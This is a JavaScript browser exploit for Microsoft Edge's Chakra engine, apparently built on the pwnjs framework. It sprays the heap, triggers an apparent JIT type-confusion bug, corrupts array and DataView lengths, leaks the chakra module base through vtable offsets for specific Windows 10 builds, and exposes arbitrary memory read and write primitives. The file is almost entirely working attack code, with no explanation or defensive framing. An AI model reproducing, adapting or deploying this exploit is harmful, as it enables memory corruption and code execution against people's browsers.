// IsDetached offset changes between major versions of Edge.
// Windows 10 1607: 0x3C
// Windows 10 1703: 0x20
var Exploit = (function() {
    var ChakraExploit = pwnjs.ChakraExploit,
        Integer = pwnjs.Integer,
        getInt8 = DataView.prototype.getInt8,
        getInt16 = DataView.prototype.getInt16,
        getInt32 = DataView.prototype.getInt32,
        setInt8 = DataView.prototype.setInt8,
        setInt16 = DataView.prototype.setInt16,
        setInt32 = DataView.prototype.setInt32;

    function Exploit() {
        ChakraExploit.call(this);

        var array_addr;	
		trigger_vuln_intarray = null;
		arrayBuffer = new ArrayBuffer(0x100)
		nativeIntArray = new Array( 0x100000 )
		dataViewArray = new Array( 0x100000)
		arw_dataview = null;
		varArray = null;
		varArray_segment_highaddr = 0;
		varArray_segment_lowaddr = 0;
		varArray_buffer_highaddr = null;
		varArray_buffer_lowaddr = null;
		readwriteaddr = null;
		bigIntArray = null;
		lowaddress_index = 0;
		highaddress_index = 0;
		
		type_highaddr = 0;
		type_lowaddr = 0;
		
		chakrabase_lowaddress = 0;
		chakrabase_highaddress = 0;
		vtable_chakra_offset = 0x0050f398;
		eghtml_lowaddress= 0;
		eghtml_highaddress = 0;

		vtable_eghtml_offset = 0x010b2418;
		shellcode_highaddr = 0;
		shellcode_lowaddr =0;
		
	    function layout_heap( )
		{
			var nativearray_index = 0;
			var dv_index = 0;
	
			for(var t=0;t<0x800;t++)
			{
				
				for(var i=0;i<0x80;i++)
				{
				
					var ia = new Array(10);
					for(let k=0;k<10;k++)
					{
						if(k==0)
							ia[0] = nativearray_index;
						else
							ia[k] = 0x44444444;
					}
					nativeIntArray[nativearray_index] = ia;
					nativearray_index = nativearray_index + 1;
				}
				
				for(var i=0;i<0x100;i++)
				{
				
					dataViewArray[dv_index] = new DataView( arrayBuffer );
					dv_index = dv_index + 1;
				}
			}
		
			trigger_vuln_intarray = nativeIntArray[0x80*0x200];
		}
		
		function construct_arw( )
		{
		

			var buffer2begin_offset = 0x58;  //intarray head size.
			var type2nativeint_offset = 0x4000; //VirtualAlloc 16k

		
		
			var fake_vuln = false;
			for( var i=0;i<nativeIntArray.length; i++)
			{
		
				if(nativeIntArray[i].length == 0x7fffffff)
				{
				
					nativeIntArray[i].slice(0,2);
					
					nativeIntArray[i][parseInt((type2nativeint_offset- buffer2begin_offset)/4 + 0x20/4 )]  = 0x7fffffff;
					nativeIntArray[i][parseInt((type2nativeint_offset- buffer2begin_offset)/4 + 0x38/4) ]  = 0x00000000;
					nativeIntArray[i][parseInt((type2nativeint_offset- buffer2begin_offset)/4 + 0x3c/4) ]  = 0x00000000;
					bigIntArray = nativeIntArray[i];
					lowaddress_index = parseInt((type2nativeint_offset- buffer2begin_offset)/4 + 0x38/4);
					highaddress_index = parseInt((type2nativeint_offset- buffer2begin_offset)/4 + 0x3c/4)
				 
					type_highaddr =  nativeIntArray[i][12 + 1];
					type_lowaddr =  nativeIntArray[i][12 ];
					
				
					nativeIntArrayVTable_highaddr = nativeIntArray[i][10 + 1];
					nativeIntArrayVTable_lowaddr = nativeIntArray[i][10];
					
					chakrabase_lowaddress = nativeIntArrayVTable_lowaddr - vtable_chakra_offset;
					chakrabase_highaddress = nativeIntArrayVTable_highaddr;
					//document.body.innerHTML =   document.body.innerHTML + "chakrabase_highaddress:0x"+ (chakrabase_highaddress>>>0).toString(16) + "<br>";
					//document.body.innerHTML = document.body.innerHTML + "chakrabase_lowaddress:0x"+ (chakrabase_lowaddress>>>0).toString(16) + "<br>";
				  
				
					nativeIntArray[ i+2 ][0] = document.createElement("button");
					varArray = nativeIntArray[ i+2 ];
					varArray_segment_highaddr = nativeIntArray[i][52 + 1];
					varArray_segment_lowaddr = nativeIntArray[i][52 ];
					varArray_buffer_highaddr = varArray_segment_highaddr;
					varArray_buffer_lowhaddr = varArray_segment_lowaddr + 0x18;
					//alert("success");
					fake_vuln = true;
					break;
				}
			}
			if( fake_vuln != true)
			{
				alert("fake the Relative address read/write vuln fail.please reopen the html and try again.")
				return;
			}
			fake_vuln = false;
	 
			for( var i=0;i<dataViewArray.length; i++)
			{
				if(dataViewArray[i].byteLength == 0x7fffffff )
				{
					//alert("find dataview array!success");
					
					arw_dataview = dataViewArray[i];
				
					fake_vuln = true;
					break;
				}
			}
			if( fake_vuln != true)
			{
				alert("fake the Absolute address read/write vuln fail.please reopen the html and try again.")
				return;
			}
		}
		
		var obj_rw = {p1:1,p2:2,p3:3,p4:4};
		obj_rw.p5 = 5;
		obj_rw.p6 = 6;
		obj_rw.p7 = 7;
		obj_rw.p8 = 8;
		obj_rw.p9 = 9;
		obj_rw.p10 = 10;
		obj_rw.p11 = 11;
		obj_rw.p12 = 12;
				
		function opt(arr,arr2 )
		{
			arr.a = 1;
			arr2.push(1);
			arr.a = obj_rw;
		}
			
	
        //1.layout_heap
		layout_heap( );

		for(let i=0;i<0x100000;i++)
		{
		    let arr = {a:1,b:2,c:3};
			let arr2 = {a:1,b:2,c:3};
			arr2.__proto__ = Array.prototype;
			opt(arr, arr2);
		}
		obj_1 = {a:1,b:2,c:3};
		obj_1.__proto__ = Array.prototype;
		opt(obj_1,obj_1);
	
		obj_1.d = trigger_vuln_intarray;
		obj_rw.p7 = 0x7fffffff;  
		obj_rw.p11 = NaN;  
		obj_rw.p12 = 0x7fffffff; 
		
        construct_arw();
        array_addr = new Integer(nativeIntArrayVTable_lowaddr, nativeIntArrayVTable_highaddr, true);
		
        //alert("success");
        this.dv = arw_dataview;
        //this.fake_object = arw_dataview;
		//alert("vtable:0x" + (this.Uint64Ptr.cast(array_addr)[0]).toString(16));
        this.initChakra(this.Uint64Ptr.cast(array_addr)[0]);
		
    }
    Exploit.prototype = Object.create(ChakraExploit.prototype);
    Exploit.prototype.constructor = Exploit;
    Exploit.prototype.read = function (address, size) {
        //this.fake_object[14] = address.low | 0;
        //this.fake_object[15] = address.high | 0;
        
		bigIntArray[highaddress_index] = address.high | 0;
       // alert(" set hight address");
        bigIntArray[lowaddress_index] = address.low | 0;
		
        switch (size) {
            case 8: return new Integer(getInt8.call(this.dv, 0, true), 0, true);
            case 16: return new Integer(getInt16.call(this.dv, 0, true), 0, true);
            case 32: return new Integer(getInt32.call(this.dv, 0, true), 0, true);
            case 64: return new Integer(getInt32.call(this.dv, 0, true), getInt32.call(this.dv, 4, true), true);
        }
    }
    Exploit.prototype.write = function (address, value, size) {
        bigIntArray[highaddress_index] = address.high | 0;
       // alert(" set hight address");
        bigIntArray[lowaddress_index] = address.low | 0;

        switch (size) {
            case 8: return setInt8.call(this.dv, 0, value.low|0, true);
            case 16: return setInt16.call(this.dv, 0, value.low|0, true);
            case 32: return setInt32.call(this.dv, 0, value.low|0, true);
            case 64:
                setInt32.call(this.dv, 0, value.low|0, true);
                setInt32.call(this.dv, 4, value.high|0, true);
        }
    }
    return Exploit;
})();